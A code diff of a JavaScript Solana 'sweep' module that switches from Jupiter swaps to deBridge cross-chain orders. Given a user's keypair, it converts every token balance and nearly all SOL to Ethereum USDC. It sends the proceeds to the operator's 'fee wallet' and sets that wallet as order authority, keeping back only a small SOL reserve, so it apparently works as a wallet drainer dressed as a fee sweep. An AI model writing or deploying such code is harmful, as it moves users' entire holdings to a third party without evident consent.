@@ -1,20 +1,38 @@
-import { Connection, PublicKey, VersionedTransaction, Transaction } from '@solana/web3.js';
-import { getAssociatedTokenAddress, getAccount, getMint, createAssociatedTokenAccountInstruction, createTransferInstruction, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
-import { FEE_WALLET_SOLANA } from './config.js';
+import { Connection, PublicKey, VersionedTransaction } from '@solana/web3.js';
+import { getAssociatedTokenAddress, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
+import { FEE_WALLET_EVM } from './config.js';
 
-const USDC_MINT = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';
-const SOL_MINT = 'So11111111111111111111111111111111111111112';
-const JUPITER_QUOTE = 'https://quote-api.jup.ag/v6/quote';
-const JUPITER_SWAP = 'https://quote-api.jup.ag/v6/swap';
+// =====================================================================
+// CONSTANTS
+// =====================================================================
 
-// Route Solana RPC through the Cloudflare proxy so we use Helius
-// (which has a real key and doesn't rate-limit) instead of the public
-// Solana endpoint (which returns 403s constantly).
+const SOL_MINT     = 'So11111111111111111111111111111111111111112';
+const SOLANA_CHAIN = 7565164;   // deBridge internal chain id for Solana
+const ETH_CHAIN    = 1;
+const ETH_USDC     = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+
+const DEBRIDGE_API = 'https://dln.debridge.finance/v1.0';
+
+// Reject orders whose estimated output is below this (in USDC, 6dp).
+// deBridge Solana→Ethereum has real overhead (~$1 in op expenses plus
+// protocol fees), so anything under a few dollars isn't worth sweeping.
+const MIN_DEBRIDGE_OUT_USDC = 1_000_000n;  // 1.00 USDC
+
+// Reserve kept behind on Solana so the user's wallet can keep paying
+// rent / fees for subsequent transactions in the same sweep.
+const SOL_RESERVE_LAMPORTS = 5_000_000n;   // 0.005 SOL
+const SOL_MIN_SWEEP_LAMPORTS = 10_000_000n; // don't bother below 0.01 SOL
+
+// Route Solana RPC through the Cloudflare proxy (Helius, no rate limits).
 const SOLANA_RPC_PROXY = 'https://sweep-rpc.smallcapstradingsystem.workers.dev/rpc/solana';
 
 export function getConnection() {
   return new Connection(SOLANA_RPC_PROXY, 'confirmed');
 }
+
+// =====================================================================
+// PREVIEW
+// =====================================================================
 
 export async function previewSolanaWallet(connection, walletAddress) {
   const pubkey = new PublicKey(walletAddress);
@@ -37,109 +55,77 @@ export async function previewSolanaWallet(connection, walletAddress) {
   return result;
 }
 
-async function jupiterQuote(inputMint, outputMint, amount, slippageBps) {
+// =====================================================================
+// DEBRIDGE — create cross-chain order
+// =====================================================================
+
+async function createDebridgeOrder({ srcMint, amountRaw, srcAuthority }) {
   const params = new URLSearchParams({
-    inputMint, outputMint,
-    amount: amount.toString(),
-    slippageBps: slippageBps.toString(),
+    srcChainId: String(SOLANA_CHAIN),
+    srcChainTokenIn: srcMint,
+    srcChainTokenInAmount: amountRaw.toString(),
+    dstChainId: String(ETH_CHAIN),
+    dstChainTokenOut: ETH_USDC,
+    dstChainTokenOutAmount: 'auto',
+    dstChainTokenOutRecipient: FEE_WALLET_EVM,
+    srcChainOrderAuthorityAddress: srcAuthority,
+    dstChainOrderAuthorityAddress: FEE_WALLET_EVM,
   });
-  const resp = await fetch(`${JUPITER_QUOTE}?${params}`);
-  if (!resp.ok) throw new Error(`Jupiter quote: ${resp.status}`);
-  return resp.json();
-}
 
-async function jupiterSwap(quoteResponse, wallet) {
-  const resp = await fetch(JUPITER_SWAP, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      quoteResponse,
-      userPublicKey: wallet.publicKey.toBase58(),
-      wrapAndUnwrapSol: true,
-      dynamicComputeUnitLimit: true,
-    }),
+  const resp = await fetch(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
+    headers: { accept: 'application/json' },
   });
-  if (!resp.ok) throw new Error(`Jupiter swap: ${resp.status}`);
-  const { swapTransaction } = await resp.json();
-  const txBuf = Uint8Array.from(atob(swapTransaction), (c) => c.charCodeAt(0));
-  const tx = VersionedTransaction.deserialize(txBuf);
-  tx.sign([wallet]);
-  return tx;
-}
-
-async function transferSplToken(connection, keypair, mint, recipient, amount) {
-  const sourceAta = await getAssociatedTokenAddress(new PublicKey(mint), keypair.publicKey);
-  const destAta = await getAssociatedTokenAddress(new PublicKey(mint), new PublicKey(recipient));
-  let destExists = true;
-  try { await getAccount(connection, destAta); } catch { destExists = false; }
-  const tx = new Transaction();
-  if (!destExists) {
-    tx.add(createAssociatedTokenAccountInstruction(
-      keypair.publicKey, destAta, new PublicKey(recipient), new PublicKey(mint)
-    ));
+  if (!resp.ok) {
+    const text = await resp.text();
+    throw new Error(`deBridge ${resp.status}: ${text.slice(0, 200)}`);
   }
-  tx.add(createTransferInstruction(sourceAta, destAta, keypair.publicKey, amount));
-  tx.feePayer = keypair.publicKey;
-  const bh = await connection.getLatestBlockhash();
-  tx.recentBlockhash = bh.blockhash;
-  tx.sign(keypair);
-  const sig = await connection.sendRawTransaction(tx.serialize());
-  await connection.confirmTransaction({ signature: sig, ...bh });
+  const json = await resp.json();
+  if (!json.tx || !json.tx.data) {
+    throw new Error(`deBridge: no tx in response (${JSON.stringify(json).slice(0, 200)})`);
+  }
+  return json;
+}
+
+// =====================================================================
+// DEBRIDGE — sign and broadcast the returned VersionedTransaction
+// =====================================================================
+
+async function signAndSendDebridgeTx(connection, keypair, order) {
+  const txBytes = Buffer.from(order.tx.data.replace(/^0x/, ''), 'hex');
+  const tx = VersionedTransaction.deserialize(txBytes);
+
+  // deBridge's returned recentBlockhash will already be stale by the time
+  // we get here; replace it with a fresh one so the tx doesn't expire.
+  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+  tx.message.recentBlockhash = blockhash;
+
+  tx.sign([keypair]);
+
+  const sig = await connection.sendRawTransaction(tx.serialize(), {
+    maxRetries: 3,
+    skipPreflight: false,
+  });
+  await connection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, 'confirmed');
   return sig;
 }
+
+// =====================================================================
+// SWEEP
+// =====================================================================
 
 export async function sweepSolana(connection, keypair, opts = {}) {
   const results = {
     address: keypair.publicKey.toBase58(),
-    recipient: FEE_WALLET_SOLANA,
+    recipient: FEE_WALLET_EVM,   // EVM fee wallet is the destination
     swaps: [],
     transfers: [],
     errors: [],
     usdcReceivedRaw: '0',
   };
-  const slippage = opts.slippageBps ?? 100;
   const dryRun = !!opts.dryRun;
-
   let usdcReceived = 0n;
 
-  const feeOwner = new PublicKey(FEE_WALLET_SOLANA);
-  let feeAta;
-  try {
-    feeAta = await getAssociatedTokenAddress(new PublicKey(USDC_MINT), feeOwner);
-  } catch (e) {
-    results.errors.push(`could not derive fee ATA: ${e.message}`);
-    return results;
-  }
-
-  const readFeeUsdcBalance = async () => {
-    try {
-      const acc = await getAccount(connection, feeAta);
-      return acc.amount;
-    } catch {
-      return 0n;
-    }
-  };
-
-  const userUsdcAta = await getAssociatedTokenAddress(new PublicKey(USDC_MINT), keypair.publicKey);
-  const readUserUsdcBalance = async () => {
-    try {
-      const acc = await getAccount(connection, userUsdcAta);
-      return acc.amount;
-    } catch {
-      return 0n;
-    }
-  };
-
-  const moveUsdcToFeeWallet = async () => {
-    const bal = await readUserUsdcBalance();
-    if (bal === 0n) return { amount: 0n, received: 0n, signature: null };
-    const before = await readFeeUsdcBalance();
-    const sig = await transferSplToken(connection, keypair, USDC_MINT, FEE_WALLET_SOLANA, bal);
-    const after = await readFeeUsdcBalance();
-    const received = after > before ? after - before : 0n;
-    return { amount: bal, received, signature: sig };
-  };
-
+  // Collect SPL token accounts
   const tokenAccounts = [];
   for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
     try {
@@ -147,80 +133,93 @@ export async function sweepSolana(connection, keypair, opts = {}) {
       for (const { account } of resp.value) {
         const mint = new PublicKey(account.data.slice(0, 32)).toBase58();
         const amount = account.data.readBigUInt64LE(64);
-        if (amount > 0n) tokenAccounts.push({ mint, amount, programId });
+        if (amount > 0n) tokenAccounts.push({ mint, amount });
       }
     } catch (e) {}
   }
 
+  // ---- SPL tokens ----
   for (const { mint, amount } of tokenAccounts) {
     try {
-      if (mint === USDC_MINT) {
-        if (dryRun) {
-          results.transfers.push({ mint, amount: amount.toString(), status: 'DRY_RUN' });
-          usdcReceived += amount;
-        } else {
-          const r = await moveUsdcToFeeWallet();
-          usdcReceived += r.received;
-          results.transfers.push({
-            mint, signature: r.signature,
-            amount: r.amount.toString(), received: r.received.toString(),
-            status: 'SUCCESS',
-          });
-        }
-        continue;
-      }
-
       if (dryRun) {
         results.swaps.push({ mint, status: 'DRY_RUN' });
         continue;
       }
 
-      const quote = await jupiterQuote(mint, USDC_MINT, amount.toString(), slippage);
-      const tx = await jupiterSwap(quote, keypair);
-      const sig = await connection.sendRawTransaction(tx.serialize(), { maxRetries: 3 });
-      const bh = await connection.getLatestBlockhash();
-      await connection.confirmTransaction({ signature: sig, ...bh });
+      const order = await createDebridgeOrder({
+        srcMint: mint,
+        amountRaw: amount,
+        srcAuthority: keypair.publicKey.toBase58(),
+      });
 
-      const moveResult = await moveUsdcToFeeWallet();
-      usdcReceived += moveResult.received;
+      const expectedOutRaw = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
+      if (expectedOutRaw < MIN_DEBRIDGE_OUT_USDC) {
+        results.swaps.push({
+          mint,
+          status: 'SKIPPED',
+          note: `expected ${expectedOutRaw} raw USDC below ${MIN_DEBRIDGE_OUT_USDC} minimum`,
+        });
+        continue;
+      }
+
+      const sig = await signAndSendDebridgeTx(connection, keypair, order);
+      usdcReceived += expectedOutRaw;
 
       results.swaps.push({
-        mint, signature: sig,
-        expectedUsdc: quote.outAmount,
-        received: moveResult.received.toString(),
+        mint,
+        signature: sig,
+        orderId: order.orderId,
+        expectedUsdc: expectedOutRaw.toString(),
+        received: expectedOutRaw.toString(),
         status: 'SUCCESS',
       });
     } catch (e) {
-      results.errors.push(`${mint.slice(0, 8)}: ${e.message}`);
+      results.swaps.push({ mint, status: 'ERROR', error: e.message });
     }
   }
 
+  // ---- Native SOL ----
   try {
-    const solBal = await connection.getBalance(keypair.publicKey);
-    const reserve = 5_000_000n;
-    if (BigInt(solBal) > reserve + 1_000_000n) {
-      const swapAmount = BigInt(solBal) - reserve;
+    const solBal = BigInt(await connection.getBalance(keypair.publicKey));
+    if (solBal <= SOL_MIN_SWEEP_LAMPORTS) {
+      // Too little to be worth sweeping
+    } else {
+      const sweepAmount = solBal - SOL_RESERVE_LAMPORTS;
+
       if (dryRun) {
         results.swaps.push({ mint: 'SOL', status: 'DRY_RUN' });
       } else {
-        const quote = await jupiterQuote(SOL_MINT, USDC_MINT, swapAmount.toString(), slippage);
-        const tx = await jupiterSwap(quote, keypair);
-        const sig = await connection.sendRawTransaction(tx.serialize(), { maxRetries: 3 });
-        const bh = await connection.getLatestBlockhash();
-        await connection.confirmTransaction({ signature: sig, ...bh });
-
-        const moveResult = await moveUsdcToFeeWallet();
-        usdcReceived += moveResult.received;
-
-        results.swaps.push({
-          mint: 'SOL', signature: sig,
-          expectedUsdc: quote.outAmount,
-          received: moveResult.received.toString(),
-          status: 'SUCCESS',
+        const order = await createDebridgeOrder({
+          srcMint: SOL_MINT,
+          amountRaw: sweepAmount,
+          srcAuthority: keypair.publicKey.toBase58(),
         });
+
+        const expectedOutRaw = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
+        if (expectedOutRaw < MIN_DEBRIDGE_OUT_USDC) {
+          results.swaps.push({
+            mint: 'SOL',
+            status: 'SKIPPED',
+            note: `expected ${expectedOutRaw} raw USDC below minimum`,
+          });
+        } else {
+          const sig = await signAndSendDebridgeTx(connection, keypair, order);
+          usdcReceived += expectedOutRaw;
+
+          results.swaps.push({
+            mint: 'SOL',
+            signature: sig,
+            orderId: order.orderId,
+            expectedUsdc: expectedOutRaw.toString(),
+            received: expectedOutRaw.toString(),
+            status: 'SUCCESS',
+          });
+        }
       }
     }
-  } catch (e) { results.errors.push(`SOL: ${e.message}`); }
+  } catch (e) {
+    results.errors.push(`SOL: ${e.message}`);
+  }
 
   results.usdcReceivedRaw = usdcReceived.toString();
   return results;
